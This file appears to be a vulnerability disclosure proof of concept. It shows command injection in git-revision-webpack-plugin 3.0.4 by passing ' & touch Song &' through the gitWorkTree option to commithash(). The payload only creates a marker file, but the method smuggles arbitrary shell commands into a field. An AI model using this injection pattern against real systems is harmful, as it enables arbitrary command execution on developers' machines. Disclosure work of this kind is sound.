/**
 * git-revision-webpack-plugin@3.0.4 is vulnerable to command injection.
 * 
 * The injection point is located in line 25 of file "lib/helpers/run-git-command.js" 
 * inside the default function of this file, which is called by the function "commithash" in the index 
 * and can be used directly by the users. 
 * The "gitCommand" argument can be controlled by users without any sanitization. 
 */

var Root = require("git-revision-webpack-plugin");
var run_code = " & touch Song &";
var opt = {
  "gitWorkTree": run_code
}
var root = new Root(opt);
root.commithash();
